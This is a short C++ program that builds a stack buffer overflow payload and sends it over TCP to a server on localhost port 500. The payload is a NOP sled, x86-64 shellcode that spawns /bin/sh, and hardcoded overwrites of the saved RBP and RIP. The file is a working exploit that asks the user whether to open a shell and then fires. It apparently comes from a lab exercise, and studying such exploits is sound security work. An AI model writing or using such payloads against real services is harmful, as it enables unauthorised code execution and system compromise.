#include <arpa/inet.h>
#include <iostream>
#include <string.h>
#include <sys/socket.h>
#include <sysexits.h>
#include <unistd.h> 

void overFlow()
{    
    char payload[528];
    char shellCode[] =  "\x48\x31\xff\x57\x57\x5e\x5a\x48"                      // Beginning of shellcode program.
                        "\xbf\x2f\x2f\x62\x69\x6e\x2f\x73"
                        "\x68\x48\xc1\xef\x08\x57\x54\x5f"
                        "\x6a\x3b\x58\x0f\x05"
                        "\xcc"                                                  // Stops shellcode program execution.
                        "\xf0\x2e\xff\xf6\xff\x7f\x00\x00"                      // Overwrites the RBP pointer.
                        "\xf0\x2c\xff\xf6\xff\x7f\x00\x00";                     // Overwrites the RIP pointer.
                                                                                // Previous address - 0x801000
    /* Fills the payload with initial NOP commands. */
    for(int i = 0; i < 482; i++)
        payload[i] = '\x90';

    /* Fills the payload with the proper shellcode. */
    for(int i = 482, j = 0; j < 46; i++, j++)
        payload[i] = shellCode[j];

    /* Connects to the server and sends the shellcode data. */
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(500);
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    send(sock, payload, 528, 0);
}


int main()
{
    char entry;

    std::cout << "\nWould you like to open a shell with a buffer overflow y/n"
              << std::endl;
    std::cin >> entry;

    if(entry == 'y')
        overFlow();

    return EXIT_SUCCESS;
}
